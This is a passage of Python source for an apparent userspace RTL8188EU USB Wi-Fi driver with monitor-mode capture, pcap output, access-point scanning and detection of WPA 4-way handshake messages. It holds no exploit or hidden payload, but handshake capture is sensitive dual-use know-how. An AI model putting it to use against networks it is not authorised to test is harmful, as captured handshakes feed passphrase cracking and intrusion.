import argparse
import os
import re
import struct
import sys
import time
import zlib
import itertools


def _is_termux() -> bool:
    if os.environ.get("TERMUX_VERSION") or os.environ.get("TERMUX_APP_PID"):
        return True
    prefix = str(os.environ.get("PREFIX", "") or "")
    if prefix.startswith("/data/data/com.termux/"):
        return True
    return os.path.exists("/data/data/com.termux/files/usr/bin/termux-usb")


if _is_termux():
    try:
        sys.stdout.reconfigure(line_buffering=True)
    except Exception:
        pass
    try:
        sys.stderr.reconfigure(line_buffering=True)
    except Exception:
        pass
from dataclasses import dataclass
from pathlib import Path
from typing import Dict, Iterator, List, Optional, Sequence, Tuple, Callable


def _libusb_error_name(lib, code: int) -> str:
    try:
        f = getattr(lib, "libusb_error_name", None)
        if f is None:
            return str(int(code))
        import ctypes

        f.argtypes = [ctypes.c_int]
        f.restype = ctypes.c_char_p
        s = f(int(code))
        if isinstance(s, (bytes, bytearray)):
            return s.decode("utf-8", errors="replace")
        if s is None:
            return str(int(code))
        return str(s)
    except Exception:
        return str(int(code))


def _open_device_from_usb_fd(usb_fd: int):
    import ctypes
    import usb.backend.libusb1 as libusb1
    import usb.core

    backend = libusb1.get_backend()
    lib = backend.lib

    wrap = getattr(lib, "libusb_wrap_sys_device", None)
    if wrap is None:
        raise RuntimeError("libusb_wrap_sys_device not available (need libusb >= 1.0.23)")
    wrap.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.POINTER(ctypes.c_void_p)]
    wrap.restype = ctypes.c_int

    handle = ctypes.c_void_p()
    r = int(wrap(backend.ctx, ctypes.c_void_p(int(usb_fd)), ctypes.byref(handle)))
    if r != 0:
        raise RuntimeError(f"libusb_wrap_sys_device failed: {_libusb_error_name(lib, r)}")
    if not handle:
        raise RuntimeError("libusb_wrap_sys_device returned NULL handle")

    get_dev = getattr(lib, "libusb_get_device", None)
    if get_dev is None:
        raise RuntimeError("libusb_get_device not available")
    get_dev.argtypes = [ctypes.c_void_p]
    get_dev.restype = ctypes.c_void_p
    dev_ptr = ctypes.c_void_p(get_dev(handle))
    if not dev_ptr:
        raise RuntimeError("libusb_get_device returned NULL device")

    dev_id = libusb1._Device(dev_ptr)
    dev = usb.core.Device(dev_id, backend)

    class _WrappedHandle:
        def __init__(self, *, handle, devid):
            self.handle = handle
            self.devid = devid

    dev._ctx.handle = _WrappedHandle(handle=handle, devid=dev_id.devid)
    return dev


REALTEK_USB_READ = 0xC0
REALTEK_USB_WRITE = 0x40
REALTEK_USB_CMD_REQ = 0x05
REALTEK_USB_CMD_IDX = 0x00
RTW_USB_CONTROL_MSG_TIMEOUT_MS = 500

RTL_FW_PAGE_SIZE = 4096
RTL8XXXU_FIRMWARE_POLL_MAX = 1000
RTL8XXXU_MAX_REG_POLL = 500
RTL8XXXU_FIRMWARE_HEADER_SIZE = 32

REG_SYS_FUNC = 0x0002
SYS_FUNC_BBRSTB = 1 << 0
SYS_FUNC_BB_GLB_RSTN = 1 << 1
SYS_FUNC_USBA = 1 << 2
SYS_FUNC_USBD = 1 << 4
SYS_FUNC_CPU_ENABLE = 1 << 10
SYS_FUNC_DIO_RF = 1 << 13

REG_APS_FSMCO = 0x0004
APS_FSMCO_HW_SUSPEND = 1 << 11
APS_FSMCO_PCIE = 1 << 12
APS_FSMCO_HW_POWERDOWN = 1 << 15
APS_FSMCO_MAC_ENABLE = 1 << 8

REG_SYS_CLKR = 0x0008
SYS_CLK_MAC_CLK_ENABLE = 1 << 11

REG_AFE_XTAL_CTRL = 0x0024
REG_LPLDO_CTRL = 0x0023

REG_RF_CTRL = 0x001F
RF_ENABLE = 1 << 0
RF_RSTB = 1 << 1
RF_SDMRSTB = 1 << 2

REG_CR = 0x0100
CR_HCI_TXDMA_ENABLE = 1 << 0
CR_HCI_RXDMA_ENABLE = 1 << 1
CR_TXDMA_ENABLE = 1 << 2
CR_RXDMA_ENABLE = 1 << 3
CR_PROTOCOL_ENABLE = 1 << 4
CR_SCHEDULE_ENABLE = 1 << 5
CR_MAC_TX_ENABLE = 1 << 6
CR_MAC_RX_ENABLE = 1 << 7
CR_SECURITY_ENABLE = 1 << 9
CR_CALTIMER_ENABLE = 1 << 10

REG_PBP = 0x0104
PBP_PAGE_SIZE_RX_SHIFT = 0
PBP_PAGE_SIZE_TX_SHIFT = 4

REG_TRXDMA_CTRL = 0x010C
TRXDMA_CTRL_RXDMA_AGG_EN = 1 << 2

REG_TRXFF_BNDY = 0x0114

REG_LLT_INIT = 0x01E0
LLT_OP_INACTIVE = 0x0
LLT_OP_WRITE = 0x1 << 30
LLT_OP_MASK = 0x3 << 30

REG_RQPN = 0x0200
RQPN_HI_PQ_SHIFT = 0
RQPN_LO_PQ_SHIFT = 8
RQPN_PUB_PQ_SHIFT = 16
RQPN_LOAD = 1 << 31

REG_RQPN_NPQ = 0x0214
RQPN_NPQ_SHIFT = 0
RQPN_EPQ_SHIFT = 16

REG_TXDMA_OFFSET_CHK = 0x020C
TXDMA_OFFSET_DROP_DATA_EN = 1 << 9

REG_MCU_FW_DL = 0x0080
MCU_FW_DL_ENABLE = 1 << 0
MCU_FW_DL_READY = 1 << 1
MCU_FW_DL_CSUM_REPORT = 1 << 2
MCU_WINT_INIT_READY = 1 << 6
MCU_FW_RAM_SEL = 1 << 7

REG_HMTFR = 0x01D0

REG_FW_START_ADDRESS = 0x1000

REG_MAX_AGGR_NUM = 0x04A8

REG_USB_SPECIAL_OPTION = 0xFE55
USB_SPEC_USB_AGG_ENABLE = 1 << 3

REG_RX_DRVINFO_SZ = 0x060F
REG_RCR = 0x0608
RCR_ACCEPT_AP = 1 << 0
RCR_ACCEPT_PHYS_MATCH = 1 << 1
RCR_ACCEPT_MCAST = 1 << 2
RCR_ACCEPT_BCAST = 1 << 3
RCR_ACCEPT_ADDR3 = 1 << 4
RCR_ACCEPT_PM = 1 << 5
RCR_ACCEPT_CRC32 = 1 << 8
RCR_ACCEPT_ICV = 1 << 9
RCR_ACCEPT_DATA_FRAME = 1 << 11
RCR_ACCEPT_CTRL_FRAME = 1 << 12
RCR_ACCEPT_MGMT_FRAME = 1 << 13
RCR_HTC_LOC_CTRL = 1 << 14
RCR_APPEND_PHYSTAT = 1 << 28
RCR_APPEND_ICV = 1 << 29
RCR_APPEND_MIC = 1 << 30
RCR_APPEND_FCS = 1 << 31

REG_EARLY_MODE_CONTROL_8188E = 0x04D0

REG_BW_OPMODE = 0x0603
BW_OPMODE_20MHZ = 1 << 2

REG_RESPONSE_RATE_SET = 0x0440
RSR_RSC_LOWER_SUB_CHANNEL = 1 << 21
RSR_RSC_UPPER_SUB_CHANNEL = 1 << 22
RSR_RSC_BANDWIDTH_40M = RSR_RSC_UPPER_SUB_CHANNEL | RSR_RSC_LOWER_SUB_CHANNEL

REG_FPGA0_RF_MODE = 0x0800
REG_FPGA1_RF_MODE = 0x0900
FPGA_RF_MODE = 1 << 0
FPGA_RF_MODE_CCK = 1 << 24
FPGA_RF_MODE_OFDM = 1 << 25

REG_FPGA0_POWER_SAVE = 0x0818
FPGA0_PS_LOWER_CHANNEL = 1 << 26
FPGA0_PS_UPPER_CHANNEL = 1 << 27

REG_CCK0_SYSTEM = 0x0A00
CCK0_SIDEBAND = 1 << 4

REG_OFDM1_LSTF = 0x0D00
OFDM_LSTF_PRIME_CH_LOW = 1 << 10
OFDM_LSTF_PRIME_CH_HIGH = 1 << 11
OFDM_LSTF_PRIME_CH_MASK = OFDM_LSTF_PRIME_CH_LOW | OFDM_LSTF_PRIME_CH_HIGH

REG_FPGA0_XA_HSSI_PARM1 = 0x0820
FPGA0_HSSI_PARM1_PI = 1 << 8
REG_FPGA0_XA_HSSI_PARM2 = 0x0824
FPGA0_HSSI_3WIRE_DATA_LEN = 0x800
FPGA0_HSSI_3WIRE_ADDR_LEN = 0x400
FPGA0_HSSI_PARM2_ADDR_SHIFT = 23
FPGA0_HSSI_PARM2_ADDR_MASK = 0x7F800000
FPGA0_HSSI_PARM2_EDGE_READ = 1 << 31
REG_FPGA0_XA_LSSI_PARM = 0x0840
FPGA0_LSSI_PARM_ADDR_SHIFT = 20
FPGA0_LSSI_PARM_DATA_MASK = 0x000FFFFF
REG_FPGA0_XA_RF_INT_OE = 0x0860
REG_FPGA0_XA_RF_SW_CTRL = 0x0870
FPGA0_RF_RFENV = 1 << 4
REG_FPGA0_XA_LSSI_READBACK = 0x08A0
REG_HSPI_XA_READBACK = 0x08B8

REG_OFDM0_TRX_PATH_ENABLE = 0x0C04
OFDM_RF_PATH_RX_A = 1 << 0
OFDM_RF_PATH_TX_A = 1 << 4
OFDM_RF_PATH_RX_MASK = 0x0F
OFDM_RF_PATH_TX_MASK = 0xF0

REG_TXPAUSE = 0x0522

RF6052_REG_MODE_AG = 0x18
MODE_AG_CHANNEL_MASK = 0x3FF
MODE_AG_BW_MASK = (1 << 10) | (1 << 11)
MODE_AG_BW_20MHZ_8723B = (1 << 10) | (1 << 11)
MODE_AG_BW_40MHZ_8723B = 1 << 10

TXDESC32_AGG_ENABLE = 1 << 5
TXDESC32_AGG_BREAK = 1 << 6
TXDESC32_SEQ_SHIFT = 16
TXDESC32_USE_DRIVER_RATE = 1 << 8
TXDESC32_RETRY_LIMIT_ENABLE = 1 << 17
TXDESC32_RETRY_LIMIT_SHIFT = 18

TXDESC_BROADMULTICAST = 1 << 0
TXDESC_LAST_SEGMENT = 1 << 2
TXDESC_FIRST_SEGMENT = 1 << 3
TXDESC_OWN = 1 << 7

TXDESC_QUEUE_SHIFT = 8
TXDESC_QUEUE_BE = 0x0
TXDESC_QUEUE_MGNT = 0x12

TXDESC40_AGG_ENABLE = 1 << 12
TXDESC40_AGG_BREAK = 1 << 16
TXDESC_ANTENNA_SELECT_A = 1 << 24
TXDESC_ANTENNA_SELECT_B = 1 << 25
TXDESC_ANTENNA_SELECT_C = 1 << 29

DESC_RATE_1M = 0x00
DESC_RATE_6M = 0x04


def _roundup(value: int, multiple: int) -> int:
    return ((value + multiple - 1) // multiple) * multiple


def _calc_tx_desc32_csum(desc32: bytes) -> int:
    if len(desc32) != 32:
        raise ValueError(f"txdesc32 must be 32 bytes, got {len(desc32)}")
    tmp = bytearray(desc32)
    tmp[28:30] = b"\x00\x00"
    words = struct.unpack("<16H", tmp)
    csum = 0
    for w in words:
        csum ^= w
    return csum & 0xFFFF


def _mask_shift(mask: int) -> int:
    return (mask & -mask).bit_length() - 1


def _replace_bits(orig: int, value: int, mask: int) -> int:
    return (orig & ~mask) | ((value << _mask_shift(mask)) & mask)


@dataclass(frozen=True)
class Tables:
    mac_init: Sequence[Tuple[int, int]]
    phy_init: Sequence[Tuple[int, int]]
    agc: Sequence[Tuple[int, int]]
    radioa: Sequence[Tuple[int, int]]


def _extract_braced_block(text: str, name: str) -> str:
    m = re.search(rf"{re.escape(name)}\s*\[\]\s*=\s*\{{", text)
    if not m:
        raise RuntimeError(f"Table not found: {name}")
    start = m.end()
    depth = 1
    i = start
    while i < len(text) and depth:
        if text[i] == "{":
            depth += 1
        elif text[i] == "}":
            depth -= 1
        i += 1
    if depth:
        raise RuntimeError(f"Unbalanced braces in table: {name}")
    return text[start : i - 1]


def _parse_pairs(block: str) -> Sequence[Tuple[int, int]]:
    pairs = []
    for a, b in re.findall(r"\{\s*(0x[0-9a-fA-F]+|\d+)\s*,\s*(0x[0-9a-fA-F]+|\d+)\s*\}", block):
        pairs.append((int(a, 0), int(b, 0)))
    return pairs


def load_tables_from_kernel_source(src_path: Path) -> Tables:
    text = src_path.read_text(encoding="utf-8", errors="replace")
    mac = _parse_pairs(_extract_braced_block(text, "rtl8188e_mac_init_table"))
    phy = _parse_pairs(_extract_braced_block(text, "rtl8188eu_phy_init_table"))
    agc = _parse_pairs(_extract_braced_block(text, "rtl8188e_agc_table"))
    radioa = _parse_pairs(_extract_braced_block(text, "rtl8188eu_radioa_init_table"))
    return Tables(mac_init=mac, phy_init=phy, agc=agc, radioa=radioa)


@dataclass(frozen=True)
class Fops8188E:
    total_page_num: int = 0xA9
    page_num_hi: int = 0x29
    page_num_lo: int = 0x1C
    page_num_norm: int = 0x1C
    last_llt_entry: int = 175
    trxff_boundary: int = 0x25FF
    pbp_rx: int = 0x1
    pbp_tx: int = 0x1
    writeN_block_size: int = 128


@dataclass(frozen=True)
class RxDesc16:
    pktlen: int
    crc32: int
    icverr: int
    drvinfo_sz: int
    shift: int
    phy_stats: int
    swdec: int
    rxmcs: int
    rxht: int
    bw: int
    rpt_sel: int
    pkt_cnt: int
    tsfl: int


def parse_rxdesc16(buf: bytes) -> RxDesc16:
    d0, _d1, d2, d3, _d4, tsfl = struct.unpack_from("<6I", buf, 0)
    pktlen = d0 & 0x3FFF
    crc32 = (d0 >> 14) & 0x1
    icverr = (d0 >> 15) & 0x1
    drvinfo_sz = (d0 >> 16) & 0xF
    shift = (d0 >> 24) & 0x3
    phy_stats = (d0 >> 26) & 0x1
    swdec = (d0 >> 27) & 0x1

    pkt_cnt = (d2 >> 16) & 0xFF

    rxmcs = d3 & 0x3F
    rxht = (d3 >> 6) & 0x1
    bw = (d3 >> 9) & 0x1
    rpt_sel = (d3 >> 14) & 0x3

    return RxDesc16(
        pktlen=pktlen,
        crc32=crc32,
        icverr=icverr,
        drvinfo_sz=drvinfo_sz,
        shift=shift,
        phy_stats=phy_stats,
        swdec=swdec,
        rxmcs=rxmcs,
        rxht=rxht,
        bw=bw,
        rpt_sel=rpt_sel,
        pkt_cnt=pkt_cnt,
        tsfl=tsfl,
    )


def _fmt_mac(addr: bytes) -> str:
    if len(addr) != 6:
        return "??:??:??:??:??:??"
    return ":".join(f"{b:02x}" for b in addr)


def _is_unicast_mac(addr: Optional[bytes]) -> bool:
    if addr is None or len(addr) != 6:
        return False
    if addr == b"\x00\x00\x00\x00\x00\x00":
        return False
    if addr == b"\xff\xff\xff\xff\xff\xff":
        return False
    if addr[0] & 0x01:
        return False
    return True


def _decode_fc(fc: int) -> Tuple[int, int, bool, bool, bool, bool, bool, bool, bool, bool]:
    ftype = (fc >> 2) & 0x3
    subtype = (fc >> 4) & 0xF
    to_ds = bool((fc >> 8) & 0x1)
    from_ds = bool((fc >> 9) & 0x1)
    more_frag = bool((fc >> 10) & 0x1)
    retry = bool((fc >> 11) & 0x1)
    pwr_mgt = bool((fc >> 12) & 0x1)
    more_data = bool((fc >> 13) & 0x1)
    protected = bool((fc >> 14) & 0x1)
    order = bool((fc >> 15) & 0x1)
    return ftype, subtype, to_ds, from_ds, more_frag, retry, pwr_mgt, more_data, protected, order


def _fc_type_subtype_name(ftype: int, subtype: int) -> str:
    if ftype == 0:
        names = {
            0: "assoc-req",
            1: "assoc-resp",
            2: "reassoc-req",
            3: "reassoc-resp",
            4: "probe-req",
            5: "probe-resp",
            8: "beacon",
            9: "atim",
            10: "disassoc",
            11: "auth",
            12: "deauth",
            13: "action",
        }
        return f"mgmt/{names.get(subtype, hex(subtype))}"
    if ftype == 1:
        names = {
            7: "ctrl-wr",
            8: "block-ack-req",
            9: "block-ack",
            10: "ps-poll",
            11: "rts",
            12: "cts",
            13: "ack",
            14: "cf-end",
            15: "cf-end-ack",
        }
        return f"ctrl/{names.get(subtype, hex(subtype))}"
    if ftype == 2:
        names = {
            0: "data",
            4: "null",
            8: "qos-data",
            12: "qos-null",
        }
        return f"data/{names.get(subtype, hex(subtype))}"
    return f"reserved/{subtype:x}"


def _parse_addrs(payload: bytes) -> Tuple[Optional[bytes], Optional[bytes], Optional[bytes], Optional[bytes], int, int, int]:
    if len(payload) < 2:
        return None, None, None, None, 0, 0, 0
    fc = int.from_bytes(payload[0:2], "little")
    ftype = (fc >> 2) & 0x3
    subtype = (fc >> 4) & 0xF
    to_ds = bool((fc >> 8) & 0x1)
    from_ds = bool((fc >> 9) & 0x1)

    if ftype == 0:
        if len(payload) < 24:
            return None, None, None, None, ftype, subtype, 0
        a1 = payload[4:10]
        a2 = payload[10:16]
        a3 = payload[16:22]
        seq = int.from_bytes(payload[22:24], "little")
        return a1, a2, a3, None, ftype, subtype, seq

    if ftype == 2:
        if len(payload) < 24:
            return None, None, None, None, ftype, subtype, 0
        addr1 = payload[4:10]
        addr2 = payload[10:16]
        addr3 = payload[16:22]
        seq = int.from_bytes(payload[22:24], "little")
        addr4 = payload[24:30] if (to_ds and from_ds and len(payload) >= 30) else None
        return addr1, addr2, addr3, addr4, ftype, subtype, seq

    return None, None, None, None, ftype, subtype, 0


def _detect_4way_eapol(payload: bytes) -> Optional[Tuple[int, Optional[bytes], Optional[bytes], int, int]]:
    if len(payload) < 32:
        return None
    fc = int.from_bytes(payload[0:2], "little")
    ftype = (fc >> 2) & 0x3
    if ftype != 2:
        return None

    subtype = (fc >> 4) & 0xF
    to_ds = bool((fc >> 8) & 0x1)
    from_ds = bool((fc >> 9) & 0x1)
    order = bool((fc >> 15) & 0x1)

    hdr_len = 24
    if to_ds and from_ds:
        hdr_len += 6
    if subtype & 0x8:
        hdr_len += 2
    if order:
        hdr_len += 4
    if len(payload) < hdr_len + 8 + 4 + 1 + 2 + 8:
        return None

    llc = payload[hdr_len : hdr_len + 8]
    if llc != b"\xaa\xaa\x03\x00\x00\x00\x88\x8e":
        return None

    eapol_off = hdr_len + 8
    eapol_type = payload[eapol_off + 1]
    if eapol_type != 3:
        return None

    eapol_len = int.from_bytes(payload[eapol_off + 2 : eapol_off + 4], "big")
    if len(payload) < eapol_off + 4 + eapol_len:
        return None
    if eapol_len < 1 + 2 + 8:
        return None

    key_desc_type = payload[eapol_off + 4]
    if key_desc_type not in (2,):
        return None

    key_info = int.from_bytes(payload[eapol_off + 5 : eapol_off + 7], "big")
    replay = int.from_bytes(payload[eapol_off + 9 : eapol_off + 17], "big")

    key_type = bool(key_info & 0x0008)
    install = bool(key_info & 0x0010)
    ack = bool(key_info & 0x0020)
    mic = bool(key_info & 0x0040)
    secure = bool(key_info & 0x0080)

    if not key_type:
        return None

    msg: Optional[int] = None
    if ack and not mic:
        msg = 1
    elif (not ack) and mic and (not secure):
        msg = 2
    elif ack and mic and install:
        msg = 3
    elif (not ack) and mic and secure:
        msg = 4

    if msg is None:
        return None

    a1, a2, a3, _a4, _ftype2, _subtype2, _seq = _parse_addrs(payload)

    bssid: Optional[bytes] = None
    sta: Optional[bytes] = None
    if not from_ds and to_ds:
        bssid = a1
        sta = a2
    elif from_ds and not to_ds:
        bssid = a2
        sta = a1

    return msg, bssid, sta, replay, key_info


def _print_4way_if_present(payload: bytes) -> None:
    info = _detect_4way_eapol(payload)
    if info is None:
        return
    msg, bssid, sta, replay, key_info = info
    bssid_s = _fmt_mac(bssid) if bssid is not None else "??"
    sta_s = _fmt_mac(sta) if sta is not None else "??"
    sys.stderr.write(f"4wh msg{msg} bssid={bssid_s} sta={sta_s} replay={replay} key_info=0x{key_info:04x}\n")
    sys.stderr.flush()


def _parse_channel_spec(spec: str) -> List[int]:
    channels: List[int] = []
    for part in spec.split(","):
        part = part.strip()
        if not part:
            continue
        if "-" in part:
            a_s, b_s = part.split("-", 1)
            a = int(a_s.strip(), 10)
            b = int(b_s.strip(), 10)
            if a <= b:
                channels.extend(range(a, b + 1))
            else:
                channels.extend(range(a, b - 1, -1))
        else:
            channels.append(int(part, 10))
    out: List[int] = []
    seen = set()
    for ch in channels:
        if 1 <= ch <= 14 and ch not in seen:
            out.append(ch)
            seen.add(ch)
    return out


def _extract_ap_info(payload: bytes) -> Optional[dict]:
    if len(payload) < 24:
        return None
    fc = int.from_bytes(payload[0:2], "little")
    ftype = (fc >> 2) & 0x3
    subtype = (fc >> 4) & 0xF
    if ftype != 0 or subtype not in (5, 8):
        return None

    fixed_len = 12
    ies_off = 24 + fixed_len
    if len(payload) < ies_off:
        return None
    
    info = {'ssid': None, 'channel': None, 'privacy': False, 'wpa': 0, 'wpa2': 0}
    if len(payload) >= 36:
        cap_info = int.from_bytes(payload[34:36], "little")
        if cap_info & 0x0010:
            info['privacy'] = True

    ies = payload[ies_off:]
    off = 0
    while off + 2 <= len(ies):
        eid = ies[off]
        elen = ies[off + 1]
        off += 2
        if off + elen > len(ies):
            break
        data = ies[off : off + elen]
        
        if eid == 0:
            if elen == 0:
                info['ssid'] = ""
            else:
                info['ssid'] = data.decode("utf-8", errors="replace")
        elif eid == 3 and elen >= 1:
            ch = data[0]
            if 1 <= ch <= 14:
                info['channel'] = int(ch)
        elif eid == 48:
            info['wpa2'] = 1
        elif eid == 221:
            if len(data) >= 4 and data.startswith(b'\x00\x50\xf2\x01'):
                info['wpa'] = 1

        off += elen
    return info


def _chan_to_freq_mhz(ch: int) -> int:
    if ch == 14:
        return 2484
    if 1 <= ch <= 13:
        return 2407 + ch * 5
    return 0


def _radiotap_header(tsft: int, channel: int, flags: Optional[int]) -> bytes:
    has_flags = flags is not None
    present = 0x0000000B if has_flags else 0x00000009
    freq = _chan_to_freq_mhz(channel)
    chan_flags = 0x0080

    hdr = bytearray()
    hdr += struct.pack("<BBH", 0, 0, 0)
    hdr += struct.pack("<I", present)
    hdr += struct.pack("<Q", tsft & 0xFFFFFFFFFFFFFFFF)
    if has_flags:
        hdr += struct.pack("<B", int(flags))
        hdr += b"\x00"
    hdr += struct.pack("<HH", freq, chan_flags)
    struct.pack_into("<H", hdr, 2, len(hdr))
    return bytes(hdr)


def _fc_version(payload: bytes) -> int:
    if len(payload) < 2:
        return 3
    fc = int.from_bytes(payload[0:2], "little")
    return fc & 0x3


def _crc32_80211(data: bytes) -> int:
    return zlib.crc32(data) & 0xFFFFFFFF


def _strip_fcs_if_present(payload: bytes) -> Tuple[bytes, bool]:
    if len(payload) < 4:
        return payload, False
    fcs_le = int.from_bytes(payload[-4:], "little")
    calc = _crc32_80211(payload[:-4])
    if fcs_le == calc:
        return payload[:-4], True
    return payload, False


class PcapWriter:
    def __init__(self, fp, linktype: int = 127, snaplen: int = 65535) -> None:
        self.fp = fp
        self.linktype = linktype
        self.snaplen = snaplen
        self._write_global_header()

    def _write_global_header(self) -> None:
        self.fp.write(struct.pack("<IHHIIII", 0xA1B2C3D4, 2, 4, 0, 0, self.snaplen, self.linktype))
        self.fp.flush()

    def write_packet(self, payload: bytes) -> None:
        now = time.time()
        ts_sec = int(now)
        ts_usec = int((now - ts_sec) * 1_000_000)
        incl = len(payload)
        self.fp.write(struct.pack("<IIII", ts_sec, ts_usec, incl, incl))
        self.fp.write(payload)

    def flush(self) -> None:
        self.fp.flush()


class RTL8188EU:
    def __init__(self, dev, tables: Tables) -> None:
        self.dev = dev
        self.tables = tables
        self.fops = Fops8188E()

        self.cfg = None
        self.intf = None
        self.ep_in: Optional[int] = None
        self.bulk_out_eps: Sequence[int] = ()

        self.nr_out_eps = 0
        self.ep_tx_high_queue = False
        self.ep_tx_normal_queue = False
        self.ep_tx_low_queue = False
        self.current_channel = 1
        self.tx_debug = False
        self.tx_dump_bytes = 0
        self.tx_timeout_ms = 100
        self.tx_frame_counter = 0
        self.tx_seq = 0

    def open(self) -> None:
        import usb.util

        try:
            self.dev.set_configuration()
        except Exception:
            pass

        self.cfg = self.dev.get_active_configuration()
        self.intf = self.cfg[(0, 0)]

        try:
            if self.dev.is_kernel_driver_active(self.intf.bInterfaceNumber):
                self.dev.detach_kernel_driver(self.intf.bInterfaceNumber)
        except Exception:
            pass

        usb.util.claim_interface(self.dev, self.intf.bInterfaceNumber)

        bulk_in: Optional[int] = None
        bulk_out: list[int] = []
        for ep in self.intf.endpoints():
            attrs = ep.bmAttributes & 0x3
            if attrs != 2:
                continue
            addr = int(ep.bEndpointAddress)
            if addr & 0x80:
                if bulk_in is None:
                    bulk_in = addr
            else:
                bulk_out.append(addr)

        if bulk_in is None:
            raise RuntimeError("No bulk IN endpoint found")

        self.ep_in = bulk_in
        self.bulk_out_eps = tuple(bulk_out)
        self.nr_out_eps = len(bulk_out)
        self._config_endpoints_no_sie()

    def close(self) -> None:
        import usb.util

        if self.intf is not None:
            try:
                usb.util.release_interface(self.dev, self.intf.bInterfaceNumber)
            except Exception:
                pass
        try:
            usb.util.dispose_resources(self.dev)
        except Exception:
            pass

    def _ctrl_read(self, value: int, length: int) -> bytes:
        data = self.dev.ctrl_transfer(
            REALTEK_USB_READ,
            REALTEK_USB_CMD_REQ,
            value,
            REALTEK_USB_CMD_IDX,
            length,
            timeout=RTW_USB_CONTROL_MSG_TIMEOUT_MS,
        )
        return bytes(data)

    def _ctrl_write(self, value: int, data: bytes) -> int:
        return int(
            self.dev.ctrl_transfer(
                REALTEK_USB_WRITE,
                REALTEK_USB_CMD_REQ,
                value,
                REALTEK_USB_CMD_IDX,
                data,
                timeout=RTW_USB_CONTROL_MSG_TIMEOUT_MS,
            )
        )

    def read8(self, addr: int) -> int:
        return self._ctrl_read(addr, 1)[0]

    def read16(self, addr: int) -> int:
        return struct.unpack_from("<H", self._ctrl_read(addr, 2), 0)[0]

    def read32(self, addr: int) -> int:
        return struct.unpack_from("<I", self._ctrl_read(addr, 4), 0)[0]

    def write8(self, addr: int, val: int) -> None:
        wrote = self._ctrl_write(addr, bytes([val & 0xFF]))
        if wrote != 1:
            raise RuntimeError(f"write8 failed: addr=0x{addr:04x} wrote={wrote}")

    def write16(self, addr: int, val: int) -> None:
        wrote = self._ctrl_write(addr, struct.pack("<H", val & 0xFFFF))
        if wrote != 2:
            raise RuntimeError(f"write16 failed: addr=0x{addr:04x} wrote={wrote}")

    def write32(self, addr: int, val: int) -> None:
        wrote = self._ctrl_write(addr, struct.pack("<I", val & 0xFFFFFFFF))
        if wrote != 4:
            raise RuntimeError(f"write32 failed: addr=0x{addr:04x} wrote={wrote}")

    def writeN(self, addr: int, buf: bytes) -> None:
        blocksize = self.fops.writeN_block_size
        off = 0
        while off < len(buf):
            chunk = buf[off : off + blocksize]
            wrote = self._ctrl_write(addr + off, chunk)
            if wrote != len(chunk):
                raise RuntimeError(
                    f"writeN failed: addr=0x{addr+off:04x} wrote={wrote} want={len(chunk)}"
                )
            off += len(chunk)

    def _config_endpoints_no_sie(self) -> None:
        if self.nr_out_eps in (6, 5, 4, 3):
            self.ep_tx_low_queue = True
            self.ep_tx_normal_queue = True
            self.ep_tx_high_queue = True
        elif self.nr_out_eps == 2:
            self.ep_tx_normal_queue = True
            self.ep_tx_high_queue = True
        elif self.nr_out_eps == 1:
            self.ep_tx_high_queue = True
        else:
            raise RuntimeError(f"Unsupported USB TX endpoints: {self.nr_out_eps}")

    def _rtl8188e_disabled_to_emu(self) -> None:
        val16 = self.read16(REG_APS_FSMCO)
        val16 &= ~(APS_FSMCO_HW_SUSPEND | APS_FSMCO_PCIE)
        self.write16(REG_APS_FSMCO, val16)

    def _rtl8188e_emu_to_active(self) -> None:
        for _ in range(RTL8XXXU_MAX_REG_POLL):
            val32 = self.read32(REG_APS_FSMCO)
            if val32 & (1 << 17):
                break
            time.sleep(0.00001)
        else:
            raise RuntimeError("Power ready poll timeout")

        val8 = self.read8(REG_SYS_FUNC)
        val8 &= ~(SYS_FUNC_BBRSTB | SYS_FUNC_BB_GLB_RSTN)
        self.write8(REG_SYS_FUNC, val8)

        val32 = self.read32(REG_AFE_XTAL_CTRL)
        val32 |= 1 << 23
        self.write32(REG_AFE_XTAL_CTRL, val32)

        val16 = self.read16(REG_APS_FSMCO)
        val16 &= ~APS_FSMCO_HW_POWERDOWN
        self.write16(REG_APS_FSMCO, val16)

        val16 = self.read16(REG_APS_FSMCO)
        val16 &= ~(APS_FSMCO_HW_SUSPEND | APS_FSMCO_PCIE)
        self.write16(REG_APS_FSMCO, val16)

        val32 = self.read32(REG_APS_FSMCO)
        val32 |= APS_FSMCO_MAC_ENABLE
        self.write32(REG_APS_FSMCO, val32)

        for _ in range(RTL8XXXU_MAX_REG_POLL):
            val32 = self.read32(REG_APS_FSMCO)
            if (val32 & APS_FSMCO_MAC_ENABLE) == 0:
                break
            time.sleep(0.00001)
        else:
            raise RuntimeError("MAC enable poll timeout")

        val8 = self.read8(REG_LPLDO_CTRL)
        val8 &= ~(1 << 4)
        self.write8(REG_LPLDO_CTRL, val8)

    def power_on(self) -> None:
        self._rtl8188e_disabled_to_emu()
        self._rtl8188e_emu_to_active()
        val16 = (
            CR_HCI_TXDMA_ENABLE
            | CR_HCI_RXDMA_ENABLE
            | CR_TXDMA_ENABLE
            | CR_RXDMA_ENABLE
            | CR_PROTOCOL_ENABLE
            | CR_SCHEDULE_ENABLE
            | CR_SECURITY_ENABLE
            | CR_CALTIMER_ENABLE
        )
        self.write16(REG_CR, val16)

    def reset_8051(self) -> None:
        sys_func = self.read16(REG_SYS_FUNC)
        sys_func &= ~SYS_FUNC_CPU_ENABLE
        self.write16(REG_SYS_FUNC, sys_func)
        sys_func |= SYS_FUNC_CPU_ENABLE
        self.write16(REG_SYS_FUNC, sys_func)

    def init_queue_reserved_page(self) -> None:
        hq = self.fops.page_num_hi if self.ep_tx_high_queue else 0
        lq = self.fops.page_num_lo if self.ep_tx_low_queue else 0
        nq = self.fops.page_num_norm if self.ep_tx_normal_queue else 0
        eq = 0

        val32 = (nq << RQPN_NPQ_SHIFT) | (eq << RQPN_EPQ_SHIFT)
        self.write32(REG_RQPN_NPQ, val32)

        pubq = self.fops.total_page_num - hq - lq - nq - 1
        val32 = RQPN_LOAD
        val32 |= hq << RQPN_HI_PQ_SHIFT
        val32 |= lq << RQPN_LO_PQ_SHIFT
        val32 |= pubq << RQPN_PUB_PQ_SHIFT
        self.write32(REG_RQPN, val32)

    def _llt_write(self, address: int, data: int) -> None:
        value = LLT_OP_WRITE | ((address & 0xFF) << 8) | (data & 0xFF)
        self.write32(REG_LLT_INIT, value)
        for _ in range(21):
            value = self.read32(REG_LLT_INIT)
            if (value & LLT_OP_MASK) == LLT_OP_INACTIVE:
                return
        raise RuntimeError(f"LLT write timeout: address={address} data={data}")

    def init_llt_table(self) -> None:
